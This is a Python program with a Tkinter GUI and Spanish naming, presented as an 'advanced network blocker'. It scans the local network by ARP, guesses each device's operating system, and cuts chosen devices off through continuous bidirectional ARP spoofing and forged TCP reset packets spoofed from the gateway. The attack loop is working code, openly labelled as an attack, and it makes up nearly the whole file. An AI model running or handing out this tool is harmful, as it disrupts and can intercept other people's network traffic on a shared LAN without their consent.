import tkinter as tk
from tkinter import scrolledtext, messagebox, Toplevel
from scapy.all import *
import threading
import uuid
import time
import subprocess
import platform
import os
import ctypes
import sys

# Verificar privilegios de administrador
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
    sys.exit(0)

class NetworkBlocker:
    def __init__(self):
        self.ip_puerta_enlace = "192.168.1.1"
        self.mac_atacante = get_if_hwaddr(conf.iface)
        self.ataque_en_curso = False
        self.dispositivos_detectados = []
        self.dispositivos_bloqueados = []
        self.escaneo_automatico = True
        self.hilos_ataque = {}

    def obtener_mac(self, ip):
        try:
            ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
            for s, r in ans:
                return r[Ether].src
            return None
        except Exception as e:
            print(f"Error obteniendo MAC: {e}")
            return None

    def escanear_red(self):
        try:
            # Usar conf.route para obtener la interfaz y la red actual
            for net, msk, gw, iface, addr, metric in conf.route.routes:
                if gw != '0.0.0.0' and addr != '0.0.0.0':  # Encontrar la gateway por defecto
                    self.ip_puerta_enlace = gw
                    network = f"{addr}/{msk}"
                    break
            
            ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), timeout=2, verbose=False)
            
            nuevos_dispositivos = []
            for s, r in ans:
                if r[ARP].psrc != self.ip_puerta_enlace:
                    # Realizar ping para obtener TTL
                    resp = sr1(IP(dst=r[ARP].psrc)/ICMP(), timeout=1, verbose=False)
                    ttl = resp[IP].ttl if resp else 0
                    
                    sistema_operativo = "Desconocido"
                    if ttl >= 128:
                        sistema_operativo = "Windows"
                    elif ttl >= 64:
                        sistema_operativo = "Linux/Android"
                    elif ttl >= 255:
                        sistema_operativo = "Cisco/Red"
                    
                    dispositivo = {
                        "ip": r[ARP].psrc,
                        "mac": r[ARP].hwsrc,
                        "ttl": ttl,
                        "sistema_operativo": sistema_operativo
                    }
                    
                    if not any(d['ip'] == dispositivo['ip'] for d in self.dispositivos_bloqueados):
                        nuevos_dispositivos.append(dispositivo)
            
            self.dispositivos_detectados = nuevos_dispositivos
            return True
        except Exception as e:
            print(f"Error en escaneo: {e}")
            return False

    def enviar_paquetes_bloqueo(self, ip_objetivo, mac_objetivo):
        try:
            # Obtener MAC real del gateway
            mac_gateway = self.obtener_mac(self.ip_puerta_enlace)
            if not mac_gateway:
                print("No se pudo obtener MAC del gateway")
                return

            while True:
                if not self.ataque_en_curso:
                    break
                
                # ARP Spoofing bidireccional
                send(ARP(op=2, pdst=ip_objetivo, hwdst=mac_objetivo,
                        psrc=self.ip_puerta_enlace, hwsrc=self.mac_atacante), verbose=False)
                send(ARP(op=2, pdst=self.ip_puerta_enlace, hwdst=mac_gateway,
                        psrc=ip_objetivo, hwsrc=self.mac_atacante), verbose=False)
                
                # TCP RST a puertos comunes
                for port in [80, 443, 53]:
                    send(IP(src=self.ip_puerta_enlace, dst=ip_objetivo)/
                         TCP(sport=port, dport=range(1000,65535), flags="R"), verbose=False)
                
                time.sleep(0.2)

        except Exception as e:
            print(f"Error en bloqueo: {e}")

    def bloquear_dispositivo(self, ip_objetivo):
        try:
            mac_objetivo = self.obtener_mac(ip_objetivo)
            if not mac_objetivo:
                return False

            self.configurar_firewall(ip_objetivo)
            
            self.ataque_en_curso = True
            hilo = threading.Thread(
                target=self.enviar_paquetes_bloqueo,
                args=(ip_objetivo, mac_objetivo),
                daemon=True
            )
            self.hilos_ataque[ip_objetivo] = hilo
            hilo.start()
            
            return True
        except Exception as e:
            print(f"Error al bloquear: {e}")
            return False

    def desbloquear_dispositivo(self, ip_objetivo):
        try:
            # Detener el ataque
            self.ataque_en_curso = False
            if ip_objetivo in self.hilos_ataque:
                del self.hilos_ataque[ip_objetivo]

            # Restaurar ARP
            mac_objetivo = self.obtener_mac(ip_objetivo)
            mac_gateway = self.obtener_mac(self.ip_puerta_enlace)
            
            if mac_objetivo and mac_gateway:
                for _ in range(5):
                    send(ARP(op=2, pdst=ip_objetivo, hwdst=mac_objetivo,
                           psrc=self.ip_puerta_enlace, hwsrc=mac_gateway), verbose=False)
                    send(ARP(op=2, pdst=self.ip_puerta_enlace, hwdst=mac_gateway,
                           psrc=ip_objetivo, hwsrc=mac_objetivo), verbose=False)
                    time.sleep(0.2)

            # Eliminar reglas de firewall
            self.eliminar_reglas_firewall(ip_objetivo)
            return True
        except Exception as e:
            print(f"Error al desbloquear: {e}")
            return False

    def configurar_firewall(self, ip_objetivo):
        try:
            if platform.system().lower() == "windows":
                subprocess.run([
                    "netsh", "advfirewall", "firewall", "add", "rule",
                    f"name=BlockIP_{ip_objetivo}", "dir=out", "action=block",
                    f"remoteip={ip_objetivo}"
                ], check=True)
                subprocess.run([
                    "netsh", "advfirewall", "firewall", "add", "rule",
                    f"name=BlockIP_{ip_objetivo}_in", "dir=in", "action=block",
                    f"remoteip={ip_objetivo}"
                ], check=True)
        except Exception as e:
            print(f"Error configurando firewall: {e}")

    def eliminar_reglas_firewall(self, ip_objetivo):
        try:
            if platform.system().lower() == "windows":
                subprocess.run([
                    "netsh", "advfirewall", "firewall", "delete", "rule",
                    f"name=BlockIP_{ip_objetivo}"
                ], check=True)
                subprocess.run([
                    "netsh", "advfirewall", "firewall", "delete", "rule",
                    f"name=BlockIP_{ip_objetivo}_in"
                ], check=True)
        except Exception as e:
            print(f"Error eliminando reglas firewall: {e}")

class NetworkBlockerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Bloqueador de Red Avanzado")
        self.root.geometry("800x600")
        
        self.blocker = NetworkBlocker()
        self.setup_gui()
        self.iniciar_escaneo_automatico()

    def setup_gui(self):
        main_frame = tk.Frame(self.root, padx=10, pady=10)
        main_frame.pack(fill=tk.BOTH, expand=True)

        # Frame de control superior
        control_frame = tk.Frame(main_frame)
        control_frame.pack(fill=tk.X, pady=(0, 10))

        # Botones de control
        self.btn_scan = tk.Button(control_frame, text="Escanear Ahora", 
                                command=self.escanear_manual,
                                bg="#4CAF50", fg="white")
        self.btn_scan.pack(side=tk.LEFT, expand=True, padx=5)

        self.btn_auto = tk.Button(control_frame, text="Auto-Escaneo: ON",
                                command=self.toggle_auto_scan,
                                bg="#2196F3", fg="white")
        self.btn_auto.pack(side=tk.LEFT, expand=True, padx=5)

        # Lista de dispositivos
        tk.Label(main_frame, text="Dispositivos detectados:").pack(anchor=tk.W)
        self.lista_dispositivos = tk.Listbox(main_frame, height=10)
        self.lista_dispositivos.pack(fill=tk.X, pady=(0, 10))

        # Frame de botones de acción
        action_frame = tk.Frame(main_frame)
        action_frame.pack(fill=tk.X, pady=(0, 10))

        tk.Button(action_frame, text="Bloquear Dispositivo",
                 command=self.bloquear_seleccionado,
                 bg="#f44336", fg="white").pack(side=tk.LEFT, expand=True, padx=5)

        tk.Button(action_frame, text="Ver Bloqueados",
                 command=self.mostrar_bloqueados,
                 bg="#9C27B0", fg="white").pack(side=tk.LEFT, expand=True, padx=5)

        # Área de logs
        tk.Label(main_frame, text="Registro de eventos:").pack(anchor=tk.W)
        self.log_area = scrolledtext.ScrolledText(main_frame, height=10)
        self.log_area.pack(fill=tk.BOTH, expand=True)

    def log(self, mensaje):
        self.log_area.insert(tk.END, f"{mensaje}\n")
        self.log_area.see(tk.END)

    def actualizar_lista_dispositivos(self):
        self.lista_dispositivos.delete(0, tk.END)
        for dispositivo in self.blocker.dispositivos_detectados:
            self.lista_dispositivos.insert(tk.END, 
                f"IP: {dispositivo['ip']} - MAC: {dispositivo['mac']} - SO: {dispositivo['sistema_operativo']}")

    def escanear_manual(self):
        self.log("Iniciando escaneo manual...")
        if self.blocker.escanear_red():
            self.actualizar_lista_dispositivos()
            self.log("Escaneo completado.")
        else:
            self.log("Error durante el escaneo.")

    def toggle_auto_scan(self):
        self.blocker.escaneo_automatico = not self.blocker.escaneo_automatico
        if self.blocker.escaneo_automatico:
            self.btn_auto.config(text="Auto-Escaneo: ON", bg="#2196F3")
            self.log("Auto-escaneo activado")
        else:
            self.btn_auto.config(text="Auto-Escaneo: OFF", bg="#9E9E9E")
            self.log("Auto-escaneo desactivado")

    def iniciar_escaneo_automatico(self):
        def escaneo_loop():
            while True:
                if self.blocker.escaneo_automatico:
                    if self.blocker.escanear_red():
                        self.root.after(0, self.actualizar_lista_dispositivos)
                time.sleep(30)

        threading.Thread(target=escaneo_loop, daemon=True).start()

    def bloquear_seleccionado(self):
        seleccion = self.lista_dispositivos.curselection()
        if not seleccion:
            messagebox.showwarning("Error", "Seleccione un dispositivo primero")
            return

        dispositivo = self.blocker.dispositivos_detectados[seleccion[0]]
        if self.blocker.bloquear_dispositivo(dispositivo["ip"]):
            self.blocker.dispositivos_bloqueados.append(dispositivo)
            self.blocker.dispositivos_detectados.remove(dispositivo)
            self.actualizar_lista_dispositivos()
            self.log(f"Dispositivo {dispositivo['ip']} bloqueado exitosamente")
            if hasattr(self, 'lista_bloqueados'):
                self.actualizar_lista_bloqueados()
        else:
            self.log(f"Error al bloquear dispositivo {dispositivo['ip']}")

    def mostrar_bloqueados(self):
        ventana_bloqueados = Toplevel(self.root)
        ventana_bloqueados.title("Dispositivos Bloqueados")
        ventana_bloqueados.geometry("400x500")

        tk.Label(ventana_bloqueados, text="Dispositivos bloqueados:").pack(pady=5)
        
        lista_bloqueados = tk.Listbox(ventana_bloqueados, height=15)
        lista_bloqueados.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Actualizar lista de bloqueados
        for dispositivo in self.blocker.dispositivos_bloqueados:
            lista_bloqueados.insert(tk.END,
                f"IP: {dispositivo['ip']} - MAC: {dispositivo['mac']} - SO: {dispositivo['sistema_operativo']}")

        # Botón de desbloqueo
        def desbloquear():
            seleccion = lista_bloqueados.curselection()
            if not seleccion:
                messagebox.showwarning("Error", "Seleccione un dispositivo primero")
                return

            dispositivo = self.blocker.dispositivos_bloqueados[seleccion[0]]
            if self.blocker.desbloquear_dispositivo(dispositivo["ip"]):
                self.blocker.dispositivos_bloqueados.remove(dispositivo)
                lista_bloqueados.delete(seleccion[0])
                self.log(f"Dispositivo {dispositivo['ip']} desbloqueado exitosamente")
                self.escanear_manual()
            else:
                self.log(f"Error al desbloquear dispositivo {dispositivo['ip']}")

        tk.Button(ventana_bloqueados, text="Desbloquear Seleccionado",
                 command=desbloquear,
                 bg="#FF9800", fg="white").pack(pady=10)

    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    try:
        if platform.system().lower() == "windows":
            if not is_admin():
                messagebox.showerror("Error", "Este programa requiere privilegios de administrador")
                sys.exit(1)
        else:  # Linux/Unix
            if os.geteuid() != 0:
                messagebox.showerror("Error", "Este programa requiere privilegios de root (sudo)")
                sys.exit(1)

        root = tk.Tk()
        # Eliminamos la línea problemática del iconbitmap
        
        # Establecer tema oscuro
        root.configure(bg='#2b2b2b')
        style = {
            'bg': '#2b2b2b',
            'fg': 'white',
            'button': {'bg': '#444444', 'fg': 'white'},
            'listbox': {'bg': '#333333', 'fg': 'white'},
            'text': {'bg': '#333333', 'fg': 'white'}
        }

        app = NetworkBlockerGUI(root)
        app.run()

    except Exception as e:
        messagebox.showerror("Error", f"Error al iniciar la aplicación: {str(e)}")
        sys.exit(1)